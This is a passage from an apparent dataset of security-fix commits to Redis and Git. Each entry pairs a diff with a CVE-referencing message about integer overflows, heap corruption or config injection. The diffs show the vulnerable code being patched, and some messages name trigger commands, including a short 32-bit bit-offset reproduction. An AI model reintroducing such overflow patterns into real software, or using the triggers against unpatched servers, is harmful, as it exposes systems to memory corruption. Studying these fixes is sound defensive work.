    \ to manipulate sets"
  commit_sha: 7cb89a5a1cc8ee0b003a36b2eba42573c09c45f9
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/sds.c\n+++ b/src/sds.c\n@@ -239,7 +239,7 @@ void sdsclear(sds s) {\n\
    \ sds _sdsMakeRoomFor(sds s, size_t addlen, int greedy) {\n     void *sh, *newsh;\n\
    \     size_t avail = sdsavail(s);\n-    size_t len, newlen;\n+    size_t len,\
    \ newlen, reqlen;\n     char type, oldtype = s[-1] & SDS_TYPE_MASK;\n     int\
    \ hdrlen;\n     size_t usable;\n@@ -249,7 +249,7 @@ sds _sdsMakeRoomFor(sds s,\
    \ size_t addlen, int greedy) {\n \n     len = sdslen(s);\n     sh = (char*)s-sdsHdrSize(oldtype);\n\
    -    newlen = (len+addlen);\n+    reqlen = newlen = (len+addlen);\n     assert(newlen\
    \ > len);   /* Catch size_t overflow */\n     if (greedy == 1) {\n         if\
    \ (newlen < SDS_MAX_PREALLOC)\n@@ -266,7 +266,7 @@ sds _sdsMakeRoomFor(sds s,\
    \ size_t addlen, int greedy) {\n     if (type == SDS_TYPE_5) type = SDS_TYPE_8;\n\
    \ \n     hdrlen = sdsHdrSize(type);\n-    assert(hdrlen + newlen + 1 > len); \
    \ /* Catch size_t overflow */\n+    assert(hdrlen + newlen + 1 > reqlen);  /*\
    \ Catch size_t overflow */\n     if (oldtype==type) {\n         newsh = s_realloc_usable(sh,\
    \ hdrlen+newlen+1, &usable);\n         if (newsh == NULL) return NULL;"
  commit_message: "Fix integer overflow in _sdsMakeRoomFor (CVE-2021-41099) (#9558)\n\
    \nThe existing overflow checks handled the greedy growing, but didn't handle\r\
    \na case where the addition of the header size is what causes the overflow."
  commit_sha: 24cc0b984d4ed5045c6ff125b0e619b6ce5ea9c6
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/bitops.c\n+++ b/src/bitops.c\n@@ -37,8 +37,8 @@\n /* Count number of\
    \ bits set in the binary array pointed by 's' and long\n  * 'count' bytes. The\
    \ implementation of this function is required to\n  * work with an input string\
    \ length up to 512 MB or more (server.proto_max_bulk_len) */\n-size_t redisPopcount(void\
    \ *s, long count) {\n-    size_t bits = 0;\n+long long redisPopcount(void *s,\
    \ long count) {\n+    long long bits = 0;\n     unsigned char *p = s;\n     uint32_t\
    \ *p4;\n     static const unsigned char bitsinbyte[256] = {0,1,1,2,1,2,2,3,1,2,2,3,2,3,3,4,1,2,2,3,2,3,3,4,2,3,3,4,3,4,4,5,1,2,2,3,2,3,3,4,2,3,3,4,3,4,4,5,2,3,3,4,3,4,4,5,3,4,4,5,4,5,5,6,1,2,2,3,2,3,3,4,2,3,3,4,3,4,4,5,2,3,3,4,3,4,4,5,3,4,4,5,4,5,5,6,2,3,3,4,3,4,4,5,3,4,4,5,4,5,5,6,3,4,4,5,4,5,5,6,4,5,5,6,5,6,6,7,1,2,2,3,2,3,3,4,2,3,3,4,3,4,4,5,2,3,3,4,3,4,4,5,3,4,4,5,4,5,5,6,2,3,3,4,3,4,4,5,3,4,4,5,4,5,5,6,3,4,4,5,4,5,5,6,4,5,5,6,5,6,6,7,2,3,3,4,3,4,4,5,3,4,4,5,4,5,5,6,3,4,4,5,4,5,5,6,4,5,5,6,5,6,6,7,3,4,4,5,4,5,5,6,4,5,5,6,5,6,6,7,4,5,5,6,5,6,6,7,5,6,6,7,6,7,7,8};\n\
    @@ -98,11 +98,11 @@ size_t redisPopcount(void *s, long count) {\n  * no zero bit\
    \ is found, it returns count*8 assuming the string is zero\n  * padded on the\
    \ right. However if 'bit' is 1 it is possible that there is\n  * not a single\
    \ set bit in the bitmap. In this special case -1 is returned. */\n-long redisBitpos(void\
    \ *s, unsigned long count, int bit) {\n+long long redisBitpos(void *s, unsigned\
    \ long count, int bit) {\n     unsigned long *l;\n     unsigned char *c;\n   \
    \  unsigned long skipval, word = 0, one;\n-    long pos = 0; /* Position of bit,\
    \ to return to the caller. */\n+    long long pos = 0; /* Position of bit, to\
    \ return to the caller. */\n     unsigned long j;\n     int found;\n \n@@ -410,7\
    \ +410,7 @@ void printBits(unsigned char *p, unsigned long count) {\n  * If the\
    \ 'hash' argument is true, and 'bits is positive, then the command\n  * will also\
    \ parse bit offsets prefixed by \"#\". In such a case the offset\n  * is multiplied\
    \ by 'bits'. This is useful for the BITFIELD command. */\n-int getBitOffsetFromArgument(client\
    \ *c, robj *o, size_t *offset, int hash, int bits) {\n+int getBitOffsetFromArgument(client\
    \ *c, robj *o, uint64_t *offset, int hash, int bits) {\n     long long loffset;\n\
    \     char *err = \"bit offset is not an integer or out of range\";\n     char\
    \ *p = o->ptr;\n@@ -435,7 +435,7 @@ int getBitOffsetFromArgument(client *c, robj\
    \ *o, size_t *offset, int hash, int b\n         return C_ERR;\n     }\n \n-  \
    \  *offset = (size_t)loffset;\n+    *offset = loffset;\n     return C_OK;\n }\n\
    \ \n@@ -477,7 +477,7 @@ int getBitfieldTypeFromArgument(client *c, robj *o, int\
    \ *sign, int *bits) {\n  * so that the 'maxbit' bit can be addressed. The object\
    \ is finally\n  * returned. Otherwise if the key holds a wrong type NULL is returned\
    \ and\n  * an error is sent to the client. */\n-robj *lookupStringForBitCommand(client\
    \ *c, size_t maxbit) {\n+robj *lookupStringForBitCommand(client *c, uint64_t maxbit)\
    \ {\n     size_t byte = maxbit >> 3;\n     robj *o = lookupKeyWrite(c->db,c->argv[1]);\n\
    \     if (checkType(c,o,OBJ_STRING)) return NULL;\n@@ -527,7 +527,7 @@ unsigned\
    \ char *getObjectReadOnlyString(robj *o, long *len, char *llbuf) {\n void setbitCommand(client\
    \ *c) {\n     robj *o;\n     char *err = \"bit is not an integer or out of range\"\
    ;\n-    size_t bitoffset;\n+    uint64_t bitoffset;\n     ssize_t byte, bit;\n\
    \     int byteval, bitval;\n     long on;\n@@ -566,7 +566,7 @@ void setbitCommand(client\
    \ *c) {\n void getbitCommand(client *c) {\n     robj *o;\n     char llbuf[32];\n\
    -    size_t bitoffset;\n+    uint64_t bitoffset;\n     size_t byte, bit;\n   \
    \  size_t bitval = 0;\n \n@@ -888,7 +888,7 @@ void bitposCommand(client *c) {\n\
    \         addReplyLongLong(c, -1);\n     } else {\n         long bytes = end-start+1;\n\
    -        long pos = redisBitpos(p+start,bytes,bit);\n+        long long pos =\
    \ redisBitpos(p+start,bytes,bit);\n \n         /* If we are looking for clear\
    \ bits, and the user specified an exact\n          * range with start-end, we\
    \ can't consider the right of the range as\n@@ -897,11 +897,11 @@ void bitposCommand(client\
    \ *c) {\n          * So if redisBitpos() returns the first bit outside the range,\n\
    \          * we return -1 to the caller, to mean, in the specified range there\n\
    \          * is not a single \"0\" bit. */\n-        if (end_given && bit == 0\
    \ && pos == bytes*8) {\n+        if (end_given && bit == 0 && pos == (long long)bytes<<3)\
    \ {\n             addReplyLongLong(c,-1);\n             return;\n         }\n\
    -        if (pos != -1) pos += start*8; /* Adjust for the bytes we skipped. */\n\
    +        if (pos != -1) pos += (long long)start<<3; /* Adjust for the bytes we\
    \ skipped. */\n         addReplyLongLong(c,pos);\n     }\n }\n@@ -933,12 +933,12\
    \ @@ struct bitfieldOp {\n  * GET subcommand is allowed, other subcommands will\
    \ return an error. */\n void bitfieldGeneric(client *c, int flags) {\n     robj\
    \ *o;\n-    size_t bitoffset;\n+    uint64_t bitoffset;\n     int j, numops =\
    \ 0, changes = 0;\n     struct bitfieldOp *ops = NULL; /* Array of ops to execute\
    \ at end. */\n     int owtype = BFOVERFLOW_WRAP; /* Overflow type. */\n     int\
    \ readonly = 1;\n-    size_t highest_write_offset = 0;\n+    uint64_t highest_write_offset\
    \ = 0;\n \n     for (j = 2; j < c->argc; j++) {\n         int remargs = c->argc-j-1;\
    \ /* Remaining args other than current. */\n@@ -1128,9 +1128,9 @@ void bitfieldGeneric(client\
    \ *c, int flags) {\n              * object boundaries. */\n             memset(buf,0,9);\n\
    \             int i;\n-            size_t byte = thisop->offset >> 3;\n+     \
    \       uint64_t byte = thisop->offset >> 3;\n             for (i = 0; i < 9;\
    \ i++) {\n-                if (src == NULL || i+byte >= (size_t)strlen) break;\n\
    +                if (src == NULL || i+byte >= (uint64_t)strlen) break;\n     \
    \            buf[i] = src[i+byte];\n             }\n "
  commit_message: "On 32 bit platform, the bit position of GETBIT/SETBIT/BITFIELD/BITCOUNT,BITPOS\
    \ may overflow (see CVE-2021-32761) (#9191)\n\nGETBIT, SETBIT may access wrong\
    \ address because of wrap.\r\nBITCOUNT and BITPOS may return wrapped results.\r\
    \nBITFIELD may access the wrong address but also allocate insufficient memory\
    \ and segfault (see CVE-2021-32761).\r\n\r\nThis commit uses `uint64_t` or `long\
    \ long` instead of `size_t`.\r\nrelated https://github.com/redis/redis/pull/8096\r\
    \n\r\nAt 32bit platform:\r\n> setbit bit 4294967295 1\r\n(integer) 0\r\n> config\
    \ set proto-max-bulk-len 536870913\r\nOK\r\n> append bit \"\\xFF\"\r\n(integer)\
    \ 536870913\r\n> getbit bit 4294967296\r\n(integer) 0\r\n\r\nWhen the bit index\
    \ is larger than 4294967295, size_t can't hold bit index. In the past,  `proto-max-bulk-len`\
    \ is limit to 536870912, so there is no problem.\r\n\r\nAfter this commit, bit\
    \ position is stored in `uint64_t` or `long long`. So when `proto-max-bulk-len\
    \ > 536870912`, 32bit platforms can still be correct.\r\n\r\nFor 64bit platform,\
    \ this problem still exists. The major reason is bit pos 8 times of byte pos.\
    \ When proto-max-bulk-len is very larger, bit pos may overflow.\r\nBut at 64bit\
    \ platform, we don't have so long string. So this bug may never happen.\r\n\r\n\
    Additionally this commit add a test cost `512MB` memory which is tag as `large-memory`.\
    \ Make freebsd ci and valgrind ci ignore this test."
  commit_sha: 71d452876ebf8456afaadd6b3c27988abadd1148
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/t_string.c\n+++ b/src/t_string.c\n@@ -800,6 +800,12 @@ void stralgoLCS(client\
    \ *c) {\n         goto cleanup;\n     }\n \n+    /* Detect string truncation or\
    \ later overflows. */\n+    if (sdslen(a) >= UINT32_MAX-1 || sdslen(b) >= UINT32_MAX-1)\
    \ {\n+        addReplyError(c, \"String too long for LCS\");\n+        goto cleanup;\n\
    +    }\n+\n     /* Compute the LCS using the vanilla dynamic programming technique\
    \ of\n      * building a table of LCS(x,y) substrings. */\n     uint32_t alen\
    \ = sdslen(a);\n@@ -808,9 +814,19 @@ void stralgoLCS(client *c) {\n     /* Setup\
    \ an uint32_t array to store at LCS[i,j] the length of the\n      * LCS A0..i-1,\
    \ B0..j-1. Note that we have a linear array here, so\n      * we index it as LCS[j+(blen+1)*j]\
    \ */\n-    uint32_t *lcs = zmalloc((size_t)(alen+1)*(blen+1)*sizeof(uint32_t));\n\
    \     #define LCS(A,B) lcs[(B)+((A)*(blen+1))]\n \n+    /* Try to allocate the\
    \ LCS table, and abort on overflow or insufficient memory. */\n+    unsigned long\
    \ long lcssize = (unsigned long long)(alen+1)*(blen+1); /* Can't overflow due\
    \ to the size limits above. */\n+    unsigned long long lcsalloc = lcssize * sizeof(uint32_t);\n\
    +    uint32_t *lcs = NULL;\n+    if (lcsalloc < SIZE_MAX && lcsalloc / lcssize\
    \ == sizeof(uint32_t))\n+        lcs = ztrymalloc(lcsalloc);\n+    if (!lcs) {\n\
    +        addReplyError(c, \"Insufficient memory\");\n+        goto cleanup;\n\
    +    }\n+\n     /* Start building the LCS table. */\n     for (uint32_t i = 0;\
    \ i <= alen; i++) {\n         for (uint32_t j = 0; j <= blen; j++) {"
  commit_message: "Fix integer overflow in STRALGO LCS (CVE-2021-32625) (#9011)\n\n\
    An integer overflow bug in Redis version 6.0 or newer can be exploited using the\r\
    \nSTRALGO LCS command to corrupt the heap and potentially result with remote code\r\
    \nexecution. This is a result of an incomplete fix by CVE-2021-29477."
  commit_sha: 1ddecf1958924b178b76a31d989ef1e05af81964
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/t_string.c\n+++ b/src/t_string.c\n@@ -805,7 +805,7 @@ void stralgoLCS(client\
    \ *c) {\n     /* Setup an uint32_t array to store at LCS[i,j] the length of the\n\
    \      * LCS A0..i-1, B0..j-1. Note that we have a linear array here, so\n   \
    \   * we index it as LCS[j+(blen+1)*j] */\n-    uint32_t *lcs = zmalloc((alen+1)*(blen+1)*sizeof(uint32_t));\n\
    +    uint32_t *lcs = zmalloc((size_t)(alen+1)*(blen+1)*sizeof(uint32_t));\n  \
    \   #define LCS(A,B) lcs[(B)+((A)*(blen+1))]\n \n     /* Start building the LCS\
    \ table. */"
  commit_message: 'Fix integer overflow in STRALGO LCS (CVE-2021-29477)


    An integer overflow bug in Redis version 6.0 or newer could be exploited using

    the STRALGO LCS command to corrupt the heap and potentially result with remote

    code execution.'
  commit_sha: f0c5f920d0f88bd8aa376a2c05af4902789d1ef9
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/intset.c\n+++ b/src/intset.c\n@@ -281,7 +281,7 @@ uint32_t intsetLen(const\
    \ intset *is) {\n \n /* Return intset blob size in bytes. */\n size_t intsetBlobLen(intset\
    \ *is) {\n-    return sizeof(intset)+intrev32ifbe(is->length)*intrev32ifbe(is->encoding);\n\
    +    return sizeof(intset)+(size_t)intrev32ifbe(is->length)*intrev32ifbe(is->encoding);\n\
    \ }\n \n /* Validate the integrity of the data structure."
  commit_message: 'Fix integer overflow in intset (CVE-2021-29478)


    An integer overflow bug in Redis 6.2 could be exploited to corrupt the heap and

    potentially result with remote code execution.


    The vulnerability involves changing the default set-max-intset-entries

    configuration value, creating a large set key that consists of integer values

    and using the COPY command to duplicate it.


    The integer overflow bug exists in all versions of Redis starting with 2.6,

    where it could result with a corrupted RDB or DUMP payload, but not exploited

    through COPY (which did not exist before 6.2).'
  commit_sha: 29900d4e6bccdf3691bedf0ea9a5d84863fa3592
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/config.c\n+++ b/src/config.c\n@@ -2517,7 +2517,7 @@ standardConfig\
    \ configs[] = {\n     createLongLongConfig(\"cluster-node-timeout\", NULL, MODIFIABLE_CONFIG,\
    \ 0, LLONG_MAX, server.cluster_node_timeout, 15000, INTEGER_CONFIG, NULL, NULL),\n\
    \     createLongLongConfig(\"slowlog-log-slower-than\", NULL, MODIFIABLE_CONFIG,\
    \ -1, LLONG_MAX, server.slowlog_log_slower_than, 10000, INTEGER_CONFIG, NULL,\
    \ NULL),\n     createLongLongConfig(\"latency-monitor-threshold\", NULL, MODIFIABLE_CONFIG,\
    \ 0, LLONG_MAX, server.latency_monitor_threshold, 0, INTEGER_CONFIG, NULL, NULL),\n\
    -    createLongLongConfig(\"proto-max-bulk-len\", NULL, MODIFIABLE_CONFIG, 1024*1024,\
    \ LLONG_MAX, server.proto_max_bulk_len, 512ll*1024*1024, MEMORY_CONFIG, NULL,\
    \ NULL), /* Bulk request max size */\n+    createLongLongConfig(\"proto-max-bulk-len\"\
    , NULL, MODIFIABLE_CONFIG, 1024*1024, LONG_MAX, server.proto_max_bulk_len, 512ll*1024*1024,\
    \ MEMORY_CONFIG, NULL, NULL), /* Bulk request max size */\n     createLongLongConfig(\"\
    stream-node-max-entries\", NULL, MODIFIABLE_CONFIG, 0, LLONG_MAX, server.stream_node_max_entries,\
    \ 100, INTEGER_CONFIG, NULL, NULL),\n     createLongLongConfig(\"repl-backlog-size\"\
    , NULL, MODIFIABLE_CONFIG, 1, LLONG_MAX, server.repl_backlog_size, 1024*1024,\
    \ MEMORY_CONFIG, NULL, updateReplBacklogSize), /* Default: 1mb */\n "
  - "--- a/src/sds.c\n+++ b/src/sds.c\n@@ -111,6 +111,7 @@ sds _sdsnewlen(const void\
    \ *init, size_t initlen, int trymalloc) {\n     unsigned char *fp; /* flags pointer.\
    \ */\n     size_t usable;\n \n+    assert(initlen + hdrlen + 1 > initlen); /*\
    \ Catch size_t overflow */\n     sh = trymalloc?\n         s_trymalloc_usable(hdrlen+initlen+1,\
    \ &usable) :\n         s_malloc_usable(hdrlen+initlen+1, &usable);\n@@ -243,6\
    \ +244,7 @@ sds sdsMakeRoomFor(sds s, size_t addlen) {\n     len = sdslen(s);\n\
    \     sh = (char*)s-sdsHdrSize(oldtype);\n     newlen = (len+addlen);\n+    assert(newlen\
    \ > len);   /* Catch size_t overflow */\n     if (newlen < SDS_MAX_PREALLOC)\n\
    \         newlen *= 2;\n     else\n@@ -256,6 +258,7 @@ sds sdsMakeRoomFor(sds\
    \ s, size_t addlen) {\n     if (type == SDS_TYPE_5) type = SDS_TYPE_8;\n \n  \
    \   hdrlen = sdsHdrSize(type);\n+    assert(hdrlen + newlen + 1 > len);  /* Catch\
    \ size_t overflow */\n     if (oldtype==type) {\n         newsh = s_realloc_usable(sh,\
    \ hdrlen+newlen+1, &usable);\n         if (newsh == NULL) return NULL;"
  - "--- a/src/zmalloc.c\n+++ b/src/zmalloc.c\n@@ -57,6 +57,12 @@ void zlibc_free(void\
    \ *ptr) {\n #endif\n #endif\n \n+#if PREFIX_SIZE > 0\n+#define ASSERT_NO_SIZE_OVERFLOW(sz)\
    \ assert((sz) + PREFIX_SIZE > (sz))\n+#else\n+#define ASSERT_NO_SIZE_OVERFLOW(sz)\n\
    +#endif\n+\n /* Explicitly override malloc/free etc when using tcmalloc. */\n\
    \ #if defined(USE_TCMALLOC)\n #define malloc(size) tc_malloc(size)\n@@ -89,6 +95,7\
    \ @@ static void (*zmalloc_oom_handler)(size_t) = zmalloc_default_oom;\n /* Try\
    \ allocating memory, and return NULL if failed.\n  * '*usable' is set to the usable\
    \ size if non NULL. */\n void *ztrymalloc_usable(size_t size, size_t *usable)\
    \ {\n+    ASSERT_NO_SIZE_OVERFLOW(size);\n     void *ptr = malloc(size+PREFIX_SIZE);\n\
    \ \n     if (!ptr) return NULL;\n@@ -131,6 +138,7 @@ void *zmalloc_usable(size_t\
    \ size, size_t *usable) {\n  * Currently implemented only for jemalloc. Used for\
    \ online defragmentation. */\n #ifdef HAVE_DEFRAG\n void *zmalloc_no_tcache(size_t\
    \ size) {\n+    ASSERT_NO_SIZE_OVERFLOW(size);\n     void *ptr = mallocx(size+PREFIX_SIZE,\
    \ MALLOCX_TCACHE_NONE);\n     if (!ptr) zmalloc_oom_handler(size);\n     update_zmalloc_stat_alloc(zmalloc_size(ptr));\n\
    @@ -147,6 +155,7 @@ void zfree_no_tcache(void *ptr) {\n /* Try allocating memory\
    \ and zero it, and return NULL if failed.\n  * '*usable' is set to the usable\
    \ size if non NULL. */\n void *ztrycalloc_usable(size_t size, size_t *usable)\
    \ {\n+    ASSERT_NO_SIZE_OVERFLOW(size);\n     void *ptr = calloc(1, size+PREFIX_SIZE);\n\
    \     if (ptr == NULL) return NULL;\n \n@@ -187,6 +196,7 @@ void *zcalloc_usable(size_t\
    \ size, size_t *usable) {\n /* Try reallocating memory, and return NULL if failed.\n\
    \  * '*usable' is set to the usable size if non NULL. */\n void *ztryrealloc_usable(void\
    \ *ptr, size_t size, size_t *usable) {\n+    ASSERT_NO_SIZE_OVERFLOW(size);\n\
    \ #ifndef HAVE_MALLOC_SIZE\n     void *realptr;\n #endif"
  commit_message: "Fix integer overflow (CVE-2021-21309). (#8522)\n\nOn 32-bit systems,\
    \ setting the proto-max-bulk-len config parameter to a high value may result with\
    \ integer overflow and a subsequent heap overflow when parsing an input bulk (CVE-2021-21309).\r\
    \n\r\nThis fix has two parts:\r\n\r\nSet a reasonable limit to the config parameter.\r\
    \nAdd additional checks to prevent the problem in other potential but unknown\
    \ code paths."
  commit_sha: d32f2e9999ce003bad0bd2c3bca29f64dcce4433
  repo_name: redis/redis
- commit_diff:
  - "--- a/deps/lua/src/ldo.c\n+++ b/deps/lua/src/ldo.c\n@@ -274,7 +274,7 @@ int luaD_precall\
    \ (lua_State *L, StkId func, int nresults) {\n     CallInfo *ci;\n     StkId st,\
    \ base;\n     Proto *p = cl->p;\n-    luaD_checkstack(L, p->maxstacksize);\n+\
    \    luaD_checkstack(L, p->maxstacksize + p->numparams);\n     func = restorestack(L,\
    \ funcr);\n     if (!p->is_vararg) {  /* no varargs? */\n       base = func +\
    \ 1;"
  commit_message: "Backport Lua 5.2.2 stack overflow fix. (#7733)\n\nThis fixes the\
    \ issue described in CVE-2014-5461. At this time we cannot\r\nconfirm that the\
    \ original issue has a real impact on Redis, but it is\r\nincluded as an extra\
    \ safety measure."
  commit_sha: d75ad774a92bd7de0b9448be3d622d7a13b7af27
  repo_name: redis/redis
- commit_diff:
  - "--- a/deps/lua/src/lua_struct.c\n+++ b/deps/lua/src/lua_struct.c\n@@ -89,12 +89,14\
    \ @@ typedef struct Header {\n } Header;\n \n \n-static int getnum (const char\
    \ **fmt, int df) {\n+static int getnum (lua_State *L, const char **fmt, int df)\
    \ {\n   if (!isdigit(**fmt))  /* no number? */\n     return df;  /* return default\
    \ value */\n   else {\n     int a = 0;\n     do {\n+      if (a > (INT_MAX / 10)\
    \ || a * 10 > (INT_MAX - (**fmt - '0')))\n+        luaL_error(L, \"integral size\
    \ overflow\");\n       a = a*10 + *((*fmt)++) - '0';\n     } while (isdigit(**fmt));\n\
    \     return a;\n@@ -115,9 +117,9 @@ static size_t optsize (lua_State *L, char\
    \ opt, const char **fmt) {\n     case 'f':  return sizeof(float);\n     case 'd':\
    \  return sizeof(double);\n     case 'x': return 1;\n-    case 'c': return getnum(fmt,\
    \ 1);\n+    case 'c': return getnum(L, fmt, 1);\n     case 'i': case 'I': {\n\
    -      int sz = getnum(fmt, sizeof(int));\n+      int sz = getnum(L, fmt, sizeof(int));\n\
    \       if (sz > MAXINTSIZE)\n         luaL_error(L, \"integral size %d is larger\
    \ than limit of %d\",\n                        sz, MAXINTSIZE);\n@@ -150,7 +152,7\
    \ @@ static void controloptions (lua_State *L, int opt, const char **fmt,\n  \
    \   case '>': h->endian = BIG; return;\n     case '<': h->endian = LITTLE; return;\n\
    \     case '!': {\n-      int a = getnum(fmt, MAXALIGN);\n+      int a = getnum(L,\
    \ fmt, MAXALIGN);\n       if (!isp2(a))\n         luaL_error(L, \"alignment %d\
    \ is not a power of 2\", a);\n       h->align = a;"
  commit_message: 'Merge pull request #6875 from WOOSEUNGHOON/cve20158080_fix


    [FIX] revisit CVE-2015-8080 vulnerability'
  commit_sha: 256ec6c52f5bd41437ea703801f67426af370918
  repo_name: redis/redis
- commit_diff:
  - "--- a/deps/lua/src/lua_struct.c\n+++ b/deps/lua/src/lua_struct.c\n@@ -89,12 +89,14\
    \ @@ typedef struct Header {\n } Header;\n \n \n-static int getnum (const char\
    \ **fmt, int df) {\n+static int getnum (lua_State *L, const char **fmt, int df)\
    \ {\n   if (!isdigit(**fmt))  /* no number? */\n     return df;  /* return default\
    \ value */\n   else {\n     int a = 0;\n     do {\n+      if (a > (INT_MAX / 10)\
    \ || a * 10 > (INT_MAX - (**fmt - '0')))\n+        luaL_error(L, \"integral size\
    \ overflow\");\n       a = a*10 + *((*fmt)++) - '0';\n     } while (isdigit(**fmt));\n\
    \     return a;\n@@ -115,9 +117,9 @@ static size_t optsize (lua_State *L, char\
    \ opt, const char **fmt) {\n     case 'f':  return sizeof(float);\n     case 'd':\
    \  return sizeof(double);\n     case 'x': return 1;\n-    case 'c': return getnum(fmt,\
    \ 1);\n+    case 'c': return getnum(L, fmt, 1);\n     case 'i': case 'I': {\n\
    -      int sz = getnum(fmt, sizeof(int));\n+      int sz = getnum(L, fmt, sizeof(int));\n\
    \       if (sz > MAXINTSIZE)\n         luaL_error(L, \"integral size %d is larger\
    \ than limit of %d\",\n                        sz, MAXINTSIZE);\n@@ -150,7 +152,7\
    \ @@ static void controloptions (lua_State *L, int opt, const char **fmt,\n  \
    \   case '>': h->endian = BIG; return;\n     case '<': h->endian = LITTLE; return;\n\
    \     case '!': {\n-      int a = getnum(fmt, MAXALIGN);\n+      int a = getnum(L,\
    \ fmt, MAXALIGN);\n       if (!isp2(a))\n         luaL_error(L, \"alignment %d\
    \ is not a power of 2\", a);\n       h->align = a;"
  commit_message: '[FIX] revisit CVE-2015-8080 vulnerability'
  commit_sha: ef764dde1cca2f25d00686673d1bc89448819571
  repo_name: redis/redis
- commit_diff:
  - "--- a/config.c\n+++ b/config.c\n@@ -3027,9 +3027,10 @@ void git_config_set_multivar(const\
    \ char *key, const char *value,\n \t\t\t\t\tflags);\n }\n \n-static int section_name_match\
    \ (const char *buf, const char *name)\n+static size_t section_name_match (const\
    \ char *buf, const char *name)\n {\n-\tint i = 0, j = 0, dot = 0;\n+\tsize_t i\
    \ = 0, j = 0;\n+\tint dot = 0;\n \tif (buf[i] != '[')\n \t\treturn 0;\n \tfor\
    \ (i = 1; buf[i] && buf[i] != ']'; i++) {\n@@ -3082,6 +3083,8 @@ static int section_name_is_ok(const\
    \ char *name)\n \treturn 1;\n }\n \n+#define GIT_CONFIG_MAX_LINE_LEN (512 * 1024)\n\
    +\n /* if new_name == NULL, the section is removed instead */\n static int git_config_copy_or_rename_section_in_file(const\
    \ char *config_filename,\n \t\t\t\t      const char *old_name,\n@@ -3091,11 +3094,12\
    \ @@ static int git_config_copy_or_rename_section_in_file(const char *config_filename\n\
    \ \tchar *filename_buf = NULL;\n \tstruct lock_file lock = LOCK_INIT;\n \tint\
    \ out_fd;\n-\tchar buf[1024];\n+\tstruct strbuf buf = STRBUF_INIT;\n \tFILE *config_file\
    \ = NULL;\n \tstruct stat st;\n \tstruct strbuf copystr = STRBUF_INIT;\n \tstruct\
    \ config_store_data store;\n+\tuint32_t line_nr = 0;\n \n \tmemset(&store, 0,\
    \ sizeof(store));\n \n@@ -3132,16 +3136,25 @@ static int git_config_copy_or_rename_section_in_file(const\
    \ char *config_filename\n \t\tgoto out;\n \t}\n \n-\twhile (fgets(buf, sizeof(buf),\
    \ config_file)) {\n-\t\tunsigned i;\n-\t\tint length;\n+\twhile (!strbuf_getwholeline(&buf,\
    \ config_file, '\\n')) {\n+\t\tsize_t i, length;\n \t\tint is_section = 0;\n-\t\
    \tchar *output = buf;\n-\t\tfor (i = 0; buf[i] && isspace(buf[i]); i++)\n+\t\t\
    char *output = buf.buf;\n+\n+\t\tline_nr++;\n+\n+\t\tif (buf.len >= GIT_CONFIG_MAX_LINE_LEN)\
    \ {\n+\t\t\tret = error(_(\"refusing to work with overly long line \"\n+\t\t\t\
    \t      \"in '%s' on line %\"PRIuMAX),\n+\t\t\t\t    config_filename, (uintmax_t)line_nr);\n\
    +\t\t\tgoto out;\n+\t\t}\n+\n+\t\tfor (i = 0; buf.buf[i] && isspace(buf.buf[i]);\
    \ i++)\n \t\t\t; /* do nothing */\n-\t\tif (buf[i] == '[') {\n+\t\tif (buf.buf[i]\
    \ == '[') {\n \t\t\t/* it's a section */\n-\t\t\tint offset;\n+\t\t\tsize_t offset;\n\
    \ \t\t\tis_section = 1;\n \n \t\t\t/*\n@@ -3158,7 +3171,7 @@ static int git_config_copy_or_rename_section_in_file(const\
    \ char *config_filename\n \t\t\t\tstrbuf_reset(&copystr);\n \t\t\t}\n \n-\t\t\t\
    offset = section_name_match(&buf[i], old_name);\n+\t\t\toffset = section_name_match(&buf.buf[i],\
    \ old_name);\n \t\t\tif (offset > 0) {\n \t\t\t\tret++;\n \t\t\t\tif (new_name\
    \ == NULL) {\n@@ -3233,6 +3246,7 @@ static int git_config_copy_or_rename_section_in_file(const\
    \ char *config_filename\n out_no_rollback:\n \tfree(filename_buf);\n \tconfig_store_data_clear(&store);\n\
    +\tstrbuf_release(&buf);\n \treturn ret;\n }\n "
  commit_message: "Merge branch 'tb/config-copy-or-rename-in-file-injection'\n\nAvoids\
    \ issues with renaming or deleting sections with long lines, where\nconfiguration\
    \ values may be interpreted as sections, leading to\nconfiguration injection.\
    \ Addresses CVE-2023-29007.\n\n* tb/config-copy-or-rename-in-file-injection:\n\
    \  config.c: disallow overly-long lines in `copy_or_rename_section_in_file()`\n\
    \  config.c: avoid integer truncation in `copy_or_rename_section_in_file()`\n\
    \  config: avoid fixed-sized buffer when renaming/deleting a section\n  t1300:\
    \ demonstrate failure when renaming sections with long lines\n\nSigned-off-by:\
    \ Taylor Blau <me@ttaylorr.com>"
  commit_sha: 528290f8c61222433a8cf02fb7cfffa8438432b4
  repo_name: git/git
- commit_diff:
  - "--- a/gettext.c\n+++ b/gettext.c\n@@ -109,6 +109,8 @@ static void init_gettext_charset(const\
    \ char *domain)\n \t\tsetlocale(LC_CTYPE, \"C\");\n }\n \n+int git_gettext_enabled\
    \ = 0;\n+\n void git_setup_gettext(void)\n {\n \tconst char *podir = getenv(GIT_TEXT_DOMAIN_DIR_ENVIRONMENT);\n\
    @@ -130,6 +132,8 @@ void git_setup_gettext(void)\n \tinit_gettext_charset(\"git\"\
    );\n \ttextdomain(\"git\");\n \n+\tgit_gettext_enabled = 1;\n+\n \tfree(p);\n\
    \ }\n "
  commit_message: "Merge branch 'avoid-using-uninitialized-gettext'\n\nAvoids the\
    \ overhead of calling `gettext` when initialization of the\ntranslated messages\
    \ was skipped. Addresses CVE-2023-25815.\n\n* avoid-using-uninitialized-gettext:\
    \ (1 commit)\n  gettext: avoid using gettext if the locale dir is not present"
  commit_sha: 4fe5d0b10afdc9ac5b703605b8d84d1ce5d71e87
  repo_name: git/git
- commit_diff:
  - "--- a/apply.c\n+++ b/apply.c\n@@ -4558,7 +4558,7 @@ static int write_out_one_reject(struct\
    \ apply_state *state, struct patch *patch)\n \tFILE *rej;\n \tchar namebuf[PATH_MAX];\n\
    \ \tstruct fragment *frag;\n-\tint cnt = 0;\n+\tint fd, cnt = 0;\n \tstruct strbuf\
    \ sb = STRBUF_INIT;\n \n \tfor (cnt = 0, frag = patch->fragments; frag; frag =\
    \ frag->next) {\n@@ -4598,7 +4598,17 @@ static int write_out_one_reject(struct\
    \ apply_state *state, struct patch *patch)\n \tmemcpy(namebuf, patch->new_name,\
